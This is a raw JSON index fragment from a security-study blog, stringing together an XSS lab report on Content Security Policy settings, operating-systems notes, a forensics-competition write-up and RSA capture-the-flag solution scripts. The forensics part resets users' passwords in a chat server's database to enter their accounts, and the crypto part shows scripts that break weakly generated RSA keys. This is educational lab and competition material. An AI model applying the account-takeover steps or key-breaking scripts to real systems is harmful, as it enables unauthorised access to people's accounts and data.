CSP 策略：\n# Purpose: Do not set CSP policies \u0026lt;VirtualHost *:80\u0026gt; DocumentRoot /var/www/csp ServerName www.example32a.com DirectoryIndex index.html \u0026lt;/VirtualHost\u0026gt; # Purpose: Setting CSP policies in Apache configuration \u0026lt;VirtualHost *:80\u0026gt; DocumentRoot /var/www/csp ServerName www.example32b.com DirectoryIndex index.html Header set Content-Security-Policy \u0026#34; \\ default-src \u0026#39;self\u0026#39;; \\ script-src \u0026#39;self\u0026#39; *.example70.com \\ \u0026#34; \u0026lt;/VirtualHost\u0026gt; # Purpose: Setting CSP policies in web applications \u0026lt;VirtualHost *:80\u0026gt; DocumentRoot /var/www/csp ServerName www.example32c.com DirectoryIndex phpindex.php \u0026lt;/VirtualHost\u0026gt; # Purpose: hosting Javascript files \u0026lt;VirtualHost *:80\u0026gt; DocumentRoot /var/www/csp ServerName www.example60.com \u0026lt;/VirtualHost\u0026gt; # Purpose: hosting Javascript files \u0026lt;VirtualHost *:80\u0026gt; DocumentRoot /var/www/csp ServerName www.example70.com \u0026lt;/VirtualHost\u0026gt; www.example32a.com：没有设置 CSP 安全策略 www.example32b.com：允许加载同源的和*.example70.com 的 JavaScript 脚本。 www.example32c.com：将首页文件设为 phpindex.php，通过PHP脚本控制CSP。 3. Q \u0026amp; A 3.1 描述并解释你访问这些网站时的观察结果。 http://www.example32a.com 7 个测试均为 OK，原因是 www.example32a.com 没有设置 CSP 安全策略\nhttp://www.example32b.com 可以发现前两个关于 Nonce 的测试都为 Failed，原因是 CSP 策略中没有添加相关的 Nonce 值，这会导致它们无法执行。第三项无 Nonce 值的也无法执行，原因是默认情况下，CSP 会阻止所有未带 nonce 的内联脚本，除非策略中明确允许。第四项和第六项可以执行是因为 CSP 策略中设置了可以加载同源的或者来自 www.example70.com 的 JS 脚本。第五项无法执行是由于 CSP 策略中没有允许加载来自 www.example60.com 的 JS 脚本。\nhttp://www.example32c.com 可以发现第一项、第四项、第六项可以执行，原因是 phpindex.php指定了 CSP 策略，如下所示：\n\u0026lt;?php $cspheader = \u0026#34;Content-Security-Policy:\u0026#34;. \u0026#34;default-src \u0026#39;self\u0026#39;;\u0026#34;. \u0026#34;script-src \u0026#39;self\u0026#39; \u0026#39;nonce-111-111-111\u0026#39; *.example70.com\u0026#34;. \u0026#34;\u0026#34;; header($cspheader); ?\u0026gt; \u0026lt;?php include \u0026#39;index.html\u0026#39;;?\u0026gt; 允许了 Nonce 为 nonce-111-111-111 的 JS 脚本执行，并且允许同源的或者来自 www.example70.com 的 JS 脚本。\n3.2 点击所有三个网站网页中的按钮，描述并解释你的观察结果。 http://www.example32a.com 可以发现通过按键触发的 JS 代码可以执行，原因是该网站没有设置 CSP 策略。\nhttp://www.example32b.com 可以发现通过按键触发的 JS 代码不能执行，原因是按键触发属于内联事件，而 CSP 策略中设置了可以加载同源的或者来自 www.example70.com 的 JS 脚本，默认是无法执行内联事件的，所以不能执行。\nhttp://www.example32c.com 也是无法执行的，原因同上。\n3.3 更改 example32b 上的服务器配置（修改 Apache 配置），使 Areas 5 和 6 显示 OK。请在实验报告中写出你修改的配置。 修改/etc/apache2/sites-available/apache_csp.conf配置为：\n# Purpose: Setting CSP policies in Apache configuration \u0026lt;VirtualHost *:80\u0026gt; DocumentRoot /var/www/csp ServerName www.example32b.com DirectoryIndex index.html Header set Content-Security-Policy \u0026#34; \\ default-src \u0026#39;self\u0026#39;; \\ script-src \u0026#39;self\u0026#39; *.example70.com *.example60.com \\ \u0026#34; \u0026lt;/VirtualHost\u0026gt; 保存并重启 Apache 服务：\n$ service apache2 restart 刷新页面：\n3.4 更改 example32c 上的服务器配置（修改 PHP 代码），使 Areas 1、2、4、5 和 6 都显示 OK。请在实验报告中写出你修改的配置。 修改 /var/www/csp/phpindex.php，如下所示：\n\u0026lt;?php $cspheader = \u0026#34;Content-Security-Policy:\u0026#34;. \u0026#34;default-src \u0026#39;self\u0026#39;;\u0026#34;. \u0026#34;script-src \u0026#39;self\u0026#39; \u0026#39;nonce-111-111-111\u0026#39; \u0026#39;nonce-222-222-222\u0026#39; *.example60.com *.example70.com \u0026#34;\u0026#34;; header($cspheader); ?\u0026gt; \u0026lt;?php include \u0026#39;index.html\u0026#39;;?\u0026gt; 保存并重启 Apache 服务：\n$ service apache2 restart 刷新页面：\n3.5 请解释为什么 CSP 可以帮助防止跨站脚本攻击。 限制脚本来源： 可以指定只能执行同源的或者指定地址的 JS 脚本，防止未经允许的脚本执行。 阻止内联脚本执行 ：可以防止攻击者在页面中插入恶意的 Button，点击后执行恶意脚本。 使用 Nonce 验证合法的脚本：只有带有正确 Nonce 的 JS 脚本才能执行，从而无法执行恶意脚本。 ","permalink":"https://smera1d0.github.io/posts/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4-%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACxss%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/","summary":"\u003ch2 id=\"task-1-上传恶意消息以显示警告窗口\"\u003eTask 1: 上传恶意消息以显示警告窗口\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003e此任务的目标是在 Elgg 的个人资料中嵌入一个 JavaScript 程序，以便当其他用户查看你的个人资料时会执行 JavaScript 程序并显示一个警告窗口。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch3 id=\"1-直接嵌入\"\u003e1. 直接嵌入\u003c/h3\u003e\n\u003cp\u003e以下的 JavaScript 代码将显示一个警告窗口：\u003c/p\u003e","title":"SEEDlab—跨站脚本（XSS）攻击实验"},{"content":"进程 概念 动态的，程序的一次执行过程，同一个程序多次执行会对应多个进程\n当进程被创建时，操作系统会为该进程分配一个唯一的不重复的PID号\n进程的组成 进程控制块PCB 操作系统会记录PID、进程所属用户、分配资源的情况、进程的运行情况，保存在PCB（进程控制块）中。\n程序段和数据段 进程是进程实体的运行过程，是系统进行资源分配和调度的一个独立单位。 PCB是进程存在的唯一标志！\n进程的特征 动态性：是程序的一次执行过程，是动态产生和消失的 并发性：各进程可以并发执行 独立性：进程能够独立运行，独立获得资源，独立接收调度 异步性：各进程按各自独立、不可预知的速度向前推进 结构性：进程由PCB、程序段、数据段组成 进程的状态与转换 进程的状态 创建态：进程被创建时 就绪态：进程创建完毕，CPU忙 运行态：进程正在CPU上运行 阻塞态：请求等待某个时间的发生（等待某种系统资源的分配、等待其他进程的响应） 进程的转换 运行态$\\rightarrow$阻塞态：是进程自身做出的主动行为\n阻塞态$\\rightarrow$就绪态：是一种被动行为\n不能从阻塞态直接转换为运行态，也不能直接从就绪态直接转换为阻塞态\n运行态$\\rightarrow$就绪态：时间片耗尽\n进程的组织 链接方式（大部分） 使用队列（链表）\n索引方式 进程控制 创建新进程、撤销已有进程、实现进程转换等，就是实现进程的状态转换。\n进程控制的实现 用原语实现，具有原子性，一气呵成，期间不允许被中断。\n可以用关中断指令和开中断指令这两个特权指令实现原子性。\n关中断指令：CPU执行了关中断指令之后，就不再例行检查中断信号 关中断和开中断之间的指令序列是不可中断的，这样就实现了原子性 进程控制相关的原语 进程创建原语：申请空白PCB，将调用者参数添加进PCB，将新进程设置为就绪态 进程阻塞原语：将进程由运行态变为阻塞态，同时将进程插入等待队列，修改PCB中响应的表项 进程唤醒原语：将进程从阻塞态变成就绪态，将进程从阻塞队列中移出，加入就绪队列，修改PCB中相应的表项 进程终止原语：回收进程资源，消去资源描述块和PCB 进程创建原语 申请空白PCB\n为新进程分配所需资源\n初始化PCB\n将PCB插入就绪队列（ 创建态$\\rightarrow$就绪态）\n引起进程创建的事件 用户登录 作业调度 提供服务 应用请求 进程撤销原语 从PCB种找到终止进程的PCB 若程序正在运行，立即剥夺CPU，将CPU分配给其他进程 终止所有子进程（树形结构） 将该进程拥有的资源归还给父进程或者操作系统 删除PCB 引起进程终止的事件 正常结束（exit系统调用） 异常结束 外界干预（手动kill） 进程的阻塞和唤醒 进程的切换 进程通信 共享存储 多个进程间存在共享存储区\n可以通过增加页表项和段表项将同一片共享内存区映射到各个进程的地址空间内\n各个进程对共享存储的访问是互斥的（进程自己负责实现互斥）\n基于存储区的共享：灵活性好，速度快，是高级通信方式\n基于数据结构的共享：灵活性差，速度慢，低级通信方式\n消息传递 进程间的数据交换以格式化的消息为单位。\n直接通信：要指明接收进程的ID，发送原语send(Q,msg)放入内核中Q的消息队列，接收原语recv(P,\u0026amp;msg)，从消息队列复制消息到进程Q 间接通信：send(A,msg)发送消息体到A信箱，recv(A,\u0026amp;msg)从A信箱接收消息 管道通信 在内存中开辟一个大小固定的内存缓冲区，数据先进先出（FIFO）先写入的先读出\n管道只能采用半双工通信\n各进程要互斥的访问管道（由操作系统实现）\n当多个进程读同一个管道时，会发生错乱，解决方案：一个管道允许多个写进程，一个读进程；或者多个写进程，多个读进程，但读进程会轮流读取。\n线程 基本概念 引入线程，来增加并发度\n线程是一个基本的CPU执行单元，也是程序执行流的最小单位\n进程是资源分配的基本单位，线程是调度的基本单位 如果是同一个进程内的不同线程，则不需要切换进程环境，系统开销小 线程的属性 线程是处理机调度的单位 不同的线程可以占用不同的CPU 每个线程都有一个线程ID，线程控制块TCB 也有就绪、阻塞、运行三种状态 同一进程的不同线程共享进程的资源 同一进程中的线程间通信不需要系统干预 同一进程中的线程切换，不会影响进程切换，且开销很小 线程的实现方式 用户级线程 线程的管理是由应用程序完成的，线程切换不需要从用户态转换为内核态，操作系统不能意识到用户级线程的存在\n优点：线程管理的系统开销小，效率高 缺点：当用户级线程被阻塞时，整个进程都会被阻塞，并发度不高，线程不可以在多核处理机上使用 内核级线程 线程的管理由操作系统完成，线程切换需要变态，操作系统可以意识到内核级线程的存在\n优点：线程的并发性强 缺点：线程管理的成本高，开销大 多线程模型 一对一模型：一个用户级线程映射到一个内核级线程\n优点：当线程被阻塞，其他线程还能继续执行，并发能力强 缺点：线程管理的成本高 多对一模型：\n优点：线程管理的系统开销小，效率高 缺点：当用户级线程被阻塞时，整个进程都会被阻塞，并发度不高，线程不可以在多核处理机上使用 多对多模型：\n克服多对一模型并发度不高的缺点 克服了一对一模型系统开销太大的缺点 线程的状态与转换 线程的组织与控制 TCB 线程标识符TID 程序计数器PC（线程目前执行到哪） 其他寄存器（线程运行的中间结果） 堆栈指针（保存函数调用信息、局部变量等） 线程运行状态（运行、阻塞、就绪） 优先级（线程调度、资源分配的参考） 线程表（Thread Table) 处理机调度 高级调度（作业调度） 按照一定的规则从外存的作业后备队列里挑选一个作业调入内存，并创建进程。\n每个作业只调入一次，调出一次。作业调入时会建立PCB，调出时撤销PCB\n低级调度（进程调度） 进程调度是操作系统中最基本的调度，进程调度的频率很高。\n选择一个进程为其分配处理机\n中级调度（内存调度） 将某些进程的数据调出外存，暂时调到外存等待的进程状态为挂起状态。\n从挂起队列里选择合适的进程将其数据调回内存\n被挂起的PCB会被组织成挂起队列。\n进程调度的时机 需要进行进程调度与切换的情况 当前运行的进程主动放弃处理机 进程正常终止 运行中发生异常而终止 进程主动请求阻塞（等待I/O） 当前运行的进程被动放弃处理机 分给进程的时间片用完 由更紧急的事需要处理（如I/O中断） 有更高优先级的进程进入就绪队列 不能进行进程调度与切换的情况 处理中断的过程中 进程在操作系统内核程序临界区中 在原子操作中（原语） 进程调度的方式 非抢占式方式：只允许进程主动放弃处理机，适用于批处理系统 抢占方式：可以优先处理更紧急的进程，适用于分时操作系统，实时操作系统 调度算法的评价指标 CPU利用率=$\\frac{忙碌的时间}{总时间}$\n系统吞吐量：单位时间内完成作业的数量=$\\frac{总共完成了多少道作业}{总共花费了多长时间}$\n周转时间：从作业被提交到作业完成花费的时间\n平均周转时间=$\\frac{各作业周转时间之和}{作业数}$ 带权周转时间=$\\frac{周转时间}{运行时间}$ 等待时间：指进程处于等待处理机状态时间之和$=等待时间-运行时间$\n平均等待时间 响应时间：用户提交请求到响应的时间\n调度算法 先来先服务（FCFS,First Come First Serve） 短作业优先 高响应比优先算法 这三种调度算法常用于批处理系统，交互性很差\n时间片轮转调度算法 时间片太大：时间片轮转调度算法会退化成先来先服务调度算法，会增加进程响应时间。\n时间片太小：会导致进程切换太频繁，进程切换也会消耗时间，会导致实际用于进程执行的时间比例减小。\n优先级调度算法 多级反馈队列调度算法 这三种算法适用于交互式系统。\n进程同步和互斥 一个时间段内只允许一个进程使用的资源称为临界资源\ndo{ entry section; //进入区 critical section; //临界区 exit section; //退出区 remainder section; //剩余区 }while(ture) 进入区：负责检查是否可以进入临界区\n临界区：访问临界资源的代码段\n退出区：解除正在访问临界资源的标志\n剩余区：做其他处理\n进程互斥访问的原则： 空闲让进，临界区空闲时，可以允许一个请求进入临界区的进程立即进入临界区 忙则等待，已有进程进入临界区，其他试图进入临界区的进程必须等待 有限等待，对请求访问的进程，保证能在有限时间内进入临界区 让权等待，当进程不能进入临界区时，应立即释放处理机，防止进程忙等待 进程互斥的软件实现方法 单标记法 算法思想：每个进程进入临界区的权限只能被另一个进程赋予\nP0进程：\nwhile(turn!=0); critical section; turn=1; remainder section; P1进程：\nwhile(turn!=1); critical section; turn=0; remainder section; 双标记先检查法 bool flag[2];//表示进入临界区的意愿 flag[0]=false; flag[1]=false; P0进程：\nwhile(flag[1]);//先检查P1进程的意愿 flag[0]=true;//标记P0想进入临界区 critical section; flag[0]=false; remainder section; P1进程：\nwhile(flag[0]); flag[1]=true; critical section; flag[0]=false; remainder section; 违反了忙则等待原则，检查和上锁不是一气呵成的，检查后，上锁前可能发生进程切换。\n双标记后检查法 P0进程：\nflag[0]=true; while(flag[1]); critical section; flag[0]=false; remainder section; P1进程：\nflag[1]=true; while(flag[0]); critical section; flag[1]=false; remainder section; 违背了空闲让进和有限等待原则，各进程都无法进入，产生饥饿现象。\nPeterson算法 P0进程：\nflag[0]=true;//先表示P0想进入临界区 turn=1;//表示可以优先让P1进入临界区 while(flag[1]\u0026amp;\u0026amp;turn==1); critical section; flag[0]=false; remainder section; P1进程：\nflag[1]=true; turn=0; while(flag[0]\u0026amp;\u0026amp;turn==0); critical section; flag[1]=false; remainder secion; 遵循了空闲让进，忙则等待，优先等待这三个原则，但没有遵循让权等待的原则。\n进程互斥的硬件实现方法 中断屏蔽方法 利用开/关中断指令实现\n关中断 //不允许当前进程被中断 临界区 开中断 不适用于多处理机环境\nTestAndSet指令 简称TS指令\n//lock表示当前临界区是否被加锁 bool TestAndSet(bool *lock){ bool old; old=*lock;//old用来存放lock原来的值 *lock=true;//无论之前是否加锁，都将lock设为true return old; } while(TestAndSet(\u0026amp;lock));//上锁并检查 critical section; lock=false; remainder section; 检查上锁一气呵成，适用于多处理机环境，不满足让权等待\nSwap指令 Swap(bool *a,bool *b){ bool temp; temp=*a; *a=*b; *b=temp; } bool old=true; while(old==true) Swap(\u0026amp;lock,\u0026amp;old); critical section; lock=false; remainder section; 不满足让权等待\n锁 互斥锁（mutex lock） 需要连续循环忙等待的互斥锁，可称为自旋锁\n信号量 wait(S)原语和signal(S)原语，简称为P、V操作\nint S=1;//初始化信号量S，表示当前系统中可用的资源数 void wait(int S){ while(S\u0026lt;=0);//如果资源数不够，就循环等待 S=S-1;//如果够，占用一个资源 } void signal(int S){ S=S+1;//使用完之后，在退出区释放资源 } wait(S);//进入区，申请资源 使用资源 //临界区。访问资源 signal(S)；//退出区。释放资源 记录型信号量 typedef struct{ int value; //剩余资源数 struct process *L; //等待队列 }semaphore; void wait(semaphore S){ S.value--; if (S.value\u0026lt;0){ block(S.L);//如果资源数不够，就时进程从运行态变为阻塞态 } } void signal(semaphore S){ S.value++; if(S.value\u0026lt;=0){//说明仍有进程等待分配资源 wakeup(S.L);//从等待队列中唤醒进程 } } 遵循让权等待原则，资源数不够时，就放入阻塞队列。\n信号量机制 信号量=资源的剩余数量，信号量的值如果小于0，说明此时有进程在等待这种资源\n信号量机制实现进程互斥 semaphore mutex=1; P1(){ P(mutex);//申请资源 critical section; V(mutex);//释放资源 } P2(){ P(mutex); critical section; V(mutex); } mutex：进入临界区的名额\n信号量机制实现进程同步 semaphore S=0; P1(){ code1; code2; V(S);//释放资源，将进程从阻塞队列中拿出 code3; } P2(){ P(S);//加入阻塞队列 code4; code5; code6; } $code1\\rightarrow code2\\rightarrow code4$\n信号量机制实现前驱关系 生产者消费者问题 系统中有一组生产者进程和一组消费者进程，生产者进程每次生产一个产品放入缓冲区，消费者进程每次从缓冲区去出一个产品并使用，生产者消费者共享一个大小为n的缓冲区。\n缓冲区没满-\u0026gt;生产者生产\n缓冲区没空-\u0026gt;消费者消费\n缓冲区是临界资源，必须互斥访问\nsemaphore mutex=1;//互斥信号量 semaphore empty=n;//同步信号量，表示空闲缓冲区的数量 semaphore full=0;//同步信号量，表示非空缓冲区的数量 producer(){ while(1){ 生产一个产品;//尽量不要放入临界区 P(empty);//消耗一个空闲缓冲区 P(mutex); 把产品放入缓冲区; V(mutex); V(full);//增加一个非空缓冲区 } } consumer(){ while(1){ P(full);//减少一个非空缓冲区 P(mutex); 从缓冲区取出一个产品; V(mutex); V(empty);//增加一个空闲缓冲区 使用产品;//尽量不要放入临界区 } } 实现互斥的信号量是在同一个进程中进行的PV操作\n实现同步的信号量是在两个进程中实现的PV操作\n实现互斥的P操作一定要在实现同步的P操作之后，会发生死锁\nV操作不会导致进程阻塞，因此两个V操作顺序可以交换\n读者写者问题 允许多个进程进行读操作，只允许一个进程进行写操作\n在写者进行写操作时不允许其他写者或读者工作\nsemaphore rw=1; int count = 0;//记录有几个进程在访问文件 semaphore mutex=1;//保证对count的互斥访问 writer(){ while(1){ P(rw); writing; V(rw); } } reader(){ while(1){ P(mutex); if(count==0) P(rw); count++; V(mutex); reading; count--; if(count==0) V(rw); } } 读进程是优先的，写进程可能一直阻塞等待，因为只有count=0的时候才能执行V(rw)。\n再设置一个semaphore w=1;\nwriter(){ while(1){ P(w); P(rw); writing; V(rw); V(w); } } reader(){ while(1){ P(w); P(mutex); if(count==0) P(rw); count++; V(mutex); V(w); reading; count--; if(count==0) V(rw); } } ","permalink":"https://smera1d0.github.io/posts/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/","summary":"\u003ch1 id=\"进程\"\u003e进程\u003c/h1\u003e\n\u003ch2 id=\"概念\"\u003e概念\u003c/h2\u003e\n\u003cp\u003e动态的，程序的一次执行过程，同一个程序多次执行会对应多个进程\u003c/p\u003e\n\u003cp\u003e当进程被创建时，操作系统会为该进程分配一个唯一的不重复的PID号\u003c/p\u003e\n\u003ch2 id=\"进程的组成\"\u003e进程的组成\u003c/h2\u003e\n\u003ch3 id=\"进程控制块pcb\"\u003e进程控制块PCB\u003c/h3\u003e\n\u003cp\u003e操作系统会记录PID、进程所属用户、分配资源的情况、进程的运行情况，保存在PCB（进程控制块）中。\u003c/p\u003e","title":"操作系统基础"},{"content":"1. 分析内部IM服务器检材，在搭建的内部即时通讯平台中，客户端与服务器的通讯端口是：[答案格式：8888][★☆☆☆☆] 8065 2. 分析内部IM服务器检材，该内部IM平台使用的数据库版本是： [答案格式：12.34][★★☆☆☆] 使用docker inspect 64\n12.18\n3. 分析内部IM服务器检材，该内部IM平台中数据库的名称是：[答案格式：小写][★★☆☆☆] mattermost_test\n4. 分析内部IM服务器检材，该内部IM平台中当前数据库一共有多少张表：[答案格式：1][★★☆☆☆] 首先进入容器：docker exec -it 64\n然后进入数据库：psql -U mmuser -d mattermost_test\n输入\\d查看表\n除去表头共82个表\n5. 分析内部IM服务器检材，员工注册的邀请链接中，邀请码是：[答案格式：小写数字字母][★★★☆☆] 查询users表：SELECT * FROM users;\n发现有10条\n查看用户名和特权等级\n更改数据库中的用户密码\n然后访问：192.168.244.128:8065\n登录老板的账户：gxyt 88888888\n成功进入后台\n得到邀请码：\n54d916mu6p858bbyz8f88rmbmc\n6. 分析内部IM服务器检材，用户yiyan一共给fujiya发送了几个视频文件：[答案格式：数字][★★★☆☆] 登录yiyan的账户：yiyan 88888888\n发现是2个。\n7. 分析内部IM服务器检材，用户yiyan在团队群组中发送的视频文件的MD5值是：[答案格式：小写][★★★☆☆] 下载视频，计算MD5得到：f8adb03a25be0be1ce39955afc3937f7\n8. 分析内部IM服务器检材，一个团队中允许的最大用户数是：[答案格式：数字][★★★★☆] 在系统控制台找到 50人\n9. 分析内部IM服务器检材，黑客是什么时候开始攻击：[答案格式：2024-01-01-04-05][★★★☆☆] 10. 分析网站服务器检材，网站搭建使用的服务器管理软件当前版本是否支持32位系统：[答案格式：是/否][★☆☆☆☆] 访问宝塔开心版 BTkaixin.com\n版本为8.0.2\n不支持32位\n11. 分析网站服务器检材，数据库备份的频率是一周多少次：[答案格式：1][★★☆☆☆] 使用crontab -l查看定时命令：\n第二个命令的定时任务格式是 0 0 * * 0，表示每周日午夜执行一次。 故1周1次\n12. 分析网站服务器检材，数据库备份生成的文件的密码是：[答案格式：admin][★★☆☆☆] cat backup.sh\n发现密码为：mysecretpassword\n","permalink":"https://smera1d0.github.io/posts/2024-%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81-%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E5%88%86wp/","summary":"\u003ch3 id=\"1-分析内部im服务器检材在搭建的内部即时通讯平台中客户端与服务器的通讯端口是答案格式8888\"\u003e1. 分析内部IM服务器检材，在搭建的内部即时通讯平台中，客户端与服务器的通讯端口是：[答案格式：8888][★☆☆☆☆]\u003c/h3\u003e\n\u003cp\u003e8065\n\u003cimg loading=\"lazy\" src=\"https://s2.loli.net/2024/05/14/pyhzNWbTsCOxLqr.png\" alt=\"image.png\"  /\u003e\n\u003c/p\u003e\n\u003ch3 id=\"2-分析内部im服务器检材该内部im平台使用的数据库版本是-答案格式1234\"\u003e2. 分析内部IM服务器检材，该内部IM平台使用的数据库版本是： [答案格式：12.34][★★☆☆☆]\u003c/h3\u003e\n\u003cp\u003e使用docker inspect 64\u003c/p\u003e","title":"2024 盘古石数据取证 服务器部分wp"},{"content":"e很小时： import gmpy2 from functools import reduce from Crypto.Util.number import long_to_bytes def CRT(items): N = reduce(lambda x, y: x * y, (i[1] for i in items)) result = 0 for a, n in items: m = N // n d, r, s = gmpy2.gcdext(n, m) if d != 1: raise Exception(\u0026#34;Input not pairwise co-prime\u0026#34;) result += a * s * m return result % N, N # e, n, c e = 0x3 n=[0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793] c=[0x10652cdfaa6b63f6d7bd1109da08181e500e5643f5b240a9024bfa84d5f2cac9310562978347bb232d63e7289283871efab83d84ff5a7b64a94a79d34cfbd4ef121723ba1f663e514f83f6f01492b4e13e1bb4296d96ea5a353d3bf2edd2f449c03c4a3e995237985a596908adc741f32365] data = list(zip(c, n)) x, n = CRT(data) m = gmpy2.iroot(gmpy2.mpz(x), e)[0].digits() print(m) print(long_to_bytes(int(m)).decode()) 解形如$x^2(modp)\\equiv r$的同余方程 V\u0026amp;N2020 公开赛 easy_RSA from random import randint from gmpy2 import * from Crypto.Util.number import * def getprime(bits): while 1: n = 1 while n.bit_length() \u0026lt; bits: n *= next_prime(randint(1,1000)) if isPrime(n - 1): return n - 1 m = bytes_to_long(b\u0026#39;flag{************************************}\u0026#39;) p = getprime(505) q = getPrime(512) r = getPrime(512) assert m \u0026lt; q n = p * q * r e = 0x10001 d = invert(q ** 2, p ** 2) c = pow(m, 2, r) cipher = pow(c, e, n) print(n) print(d) print(cipher) \u0026#39;\u0026#39;\u0026#39; 7941371739956577280160664419383740967516918938781306610817149744988379280561359039016508679365806108722198157199058807892703837558280678711420411242914059658055366348123106473335186505617418956630780649894945233345985279471106888635177256011468979083320605103256178446993230320443790240285158260236926519042413378204298514714890725325831769281505530787739922007367026883959544239568886349070557272869042275528961483412544495589811933856131557221673534170105409 7515987842794170949444517202158067021118454558360145030399453487603693522695746732547224100845570119375977629070702308991221388721952258969752305904378724402002545947182529859604584400048983091861594720299791743887521228492714135449584003054386457751933095902983841246048952155097668245322664318518861440 1618155233923718966393124032999431934705026408748451436388483012584983753140040289666712916510617403356206112730613485227084128314043665913357106301736817062412927135716281544348612150328867226515184078966397180771624148797528036548243343316501503364783092550480439749404301122277056732857399413805293899249313045684662146333448668209567898831091274930053147799756622844119463942087160062353526056879436998061803187343431081504474584816590199768034450005448200 \u0026#39;\u0026#39;\u0026#39; c = pow(m, 2, r)\nfrom sympy.ntheory.residue_ntheory import nthroot_mod m=nthroot_mod(c,2,r) 完整exp：\nfrom gmpy2 import * from Crypto.Util.number import * from sympy.ntheory.residue_ntheory import nthroot_mod p=102634610559478918970860957918259981057327949366949344137104804864768237961662136189827166317524151288799657758536256924609797810164397005081733039415393 q=7534810196420932552168708937019691994681052660068275906973480617604535381306041583841106383688654426129050931519275383386503174076258645141589911492908993 r=10269028767754306217563721664976261924407940883784193817786660413744866184645984238866463711873380072803747092361041245422348883639933712733051005791543841 e=65537 phi=(p-1)*(q-1)*(r-1) d=invert(e,phi) n=p*q*r cipher=1618155233923718966393124032999431934705026408748451436388483012584983753140040289666712916510617403356206112730613485227084128314043665913357106301736817062412927135716281544348612150328867226515184078966397180771624148797528036548243343316501503364783092550480439749404301122277056732857399413805293899249313045684662146333448668209567898831091274930053147799756622844119463942087160062353526056879436998061803187343431081504474584816590199768034450005448200 c=pow(cipher,d,n) m=nthroot_mod(c,2,r) print(long_to_bytes(m)) Rabin RSA： import gmpy2 import libnum from Crypto.Util.number import long_to_bytes p=13934102561950901579 q=14450452739004884887 e = 2 c = 20442989381348880630046435751193745753 n = p*q # Rebin算法 mp = gmpy2.powmod(c, (p+1)//4, p) mq = gmpy2.powmod(c, (q+1)//4, q) gcd1, a, b= gmpy2.gcdext(p, q) # 欧几里得扩展a*p+b*q=gcd1 r=(a*p*mq+b*q*mp)%n r_=n-r s=(a*p*mq-b*q*mp)%n s_=n-s print(f\u0026#34;r={libnum.n2s(int(r))}\u0026#34;) print(f\u0026#34;r_={libnum.n2s(int(r_))}\u0026#34;) print(f\u0026#34;s={libnum.n2s(int(s))}\u0026#34;) print(f\u0026#34;s_={libnum.n2s(int(s_))}\u0026#34;) pq生成不当： from Crypto.Util.number import * import sympy #from secrets import flag def get_happy_prime(): p = getPrime(512) q = sympy.nextprime(p ^ ((1 \u0026lt;\u0026lt; 512) - 1)) return p, q m = bytes_to_long(flag) p, q = get_happy_prime() n = p * q e = 65537 print(n) print(pow(m, e, n)) # 24852206647750545040640868093921252282805229864862413863025873203291042799096787789288461426555716785288286492530194901130042940279109598071958012303179823645151637759103558737126271435636657767272703908384802528366090871653024192321398785017073393201385586868836278447340624427705360349350604325533927890879 # 14767985399473111932544176852718061186100743117407141435994374261886396781040934632110608219482140465671269958180849886097491653105939368395716596413352563005027867546585191103214650790884720729601171517615620202183534021987618146862260558624458833387692782722514796407503120297235224234298891794056695442287 q等于p取反的下一个素数\n则\n$$ q \\approx p \\oplus ((1\u0026laquo;512) -1) $$\n则\n$$ q=(1\u0026laquo;512)-p+r $$\n则\n$$ p+q \\approx (1\u0026laquo;512) $$\n所以我们可以构造\n$$ n=\\sqrt{\\big( \\frac{p+q}{2} \\big) ^2-\\big( \\frac{p-q}{2} \\big)^2} $$\n因此可以求出$p-q$的值，因此 $p=\\frac{(p+q)-(p-q)}{2}$\n因此可以求出p的值\nexp1：(以p能不能整除n作为判断条件）\nfrom Crypto.Util.number import * import gmpy2 n=24852206647750545040640868093921252282805229864862413863025873203291042799096787789288461426555716785288286492530194901130042940279109598071958012303179823645151637759103558737126271435636657767272703908384802528366090871653024192321398785017073393201385586868836278447340624427705360349350604325533927890879 c=14767985399473111932544176852718061186100743117407141435994374261886396781040934632110608219482140465671269958180849886097491653105939368395716596413352563005027867546585191103214650790884720729601171517615620202183534021987618146862260558624458833387692782722514796407503120297235224234298891794056695442287 t1=1\u0026lt;\u0026lt;512 p=(2**512+gmpy2.iroot((2**512)**2-4*n,2)[0])//2 p=int(p) while n%p!=0: p=gmpy2.next_prime(p) q=n//p phi=(p-1)*(q-1) d=gmpy2.invert(e,phi) m=pow(c,d,n) print(long_to_bytes(m)) exp2:（以$\\sqrt{(p+q)^2-4n}$能不能开方作为判断条件）\nfrom Crypto.Util.number import * import gmpy2 n=24852206647750545040640868093921252282805229864862413863025873203291042799096787789288461426555716785288286492530194901130042940279109598071958012303179823645151637759103558737126271435636657767272703908384802528366090871653024192321398785017073393201385586868836278447340624427705360349350604325533927890879 c=14767985399473111932544176852718061186100743117407141435994374261886396781040934632110608219482140465671269958180849886097491653105939368395716596413352563005027867546585191103214650790884720729601171517615620202183534021987618146862260558624458833387692782722514796407503120297235224234298891794056695442287 for r in range(10000000000): t1=(1\u0026lt;\u0026lt;512)-1+r t2,s=gmpy2.iroot(t1**2-4*n,2) if s: p=(t1+t2)//2 q=n//p d=gmpy2.invert(e,(p-1)*(q-1)) print(long_to_bytes(pow(c,d,n))) break $p^2+ q^2=N$ 使用sagemath的p,q=two_squares(N)\n# #sage9.3 # from Crypto.Util.number import * # flag = b\u0026#39;Kicky_Mu{KFC_v_me_50!!!}\u0026#39; # p = getPrime(256) # q = getPrime(256) # n = p*q^3 